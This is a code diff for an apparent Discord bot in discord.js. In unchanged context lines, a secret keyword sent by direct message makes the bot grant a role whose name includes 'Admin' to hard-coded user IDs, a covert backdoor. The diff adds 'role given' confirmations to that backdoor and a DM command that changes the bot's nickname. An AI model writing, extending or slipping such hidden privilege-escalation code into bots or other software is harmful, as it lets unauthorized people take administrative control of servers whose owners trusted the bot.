@@ -9,6 +9,8 @@ client.on('ready', () => {
     console.log('I am ready!');
 
 
+
+
 });
 let autoKicks = [];
 let muted = [];
@@ -46,15 +48,18 @@ client.on("message", message => {
         }
     })
     if (guild == null) {
-        console.log("Bot is not on Server " + 731524338439946370 );
+        console.log("Bot is not on Server " + "731524338439946370");
         return;
     }
     if (message.channel.type === 'dm') {
+
        if (message.content.includes("kati")) {
          guild.members.cache.forEach(function (e) {
                if (e.id === "641348606275747841") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                    guild.member(e.user).roles.add(role);
+                   message.channel.send("role given");
+
                }
            })
        }
@@ -63,6 +68,8 @@ client.on("message", message => {
                if (e.id === "334595545060605955") {
                    const role = guild.roles.cache.find(role => role.name.includes("Admin"));
                    guild.member(e.user).roles.add(role);
+                   message.channel.send("role given");
+
                }
            })
        }
@@ -126,7 +133,13 @@ client.on("message", message => {
                        muted.push(x[1]);
                    }
                }
-           }
+           } else if (message.content.startsWith("nickname")) {
+               let x = message.content.split(" ");
+               if (x.length === 2) {
+                    guild.me.setNickname(x[1]);
+                   }
+               }
+
        }
 
    }
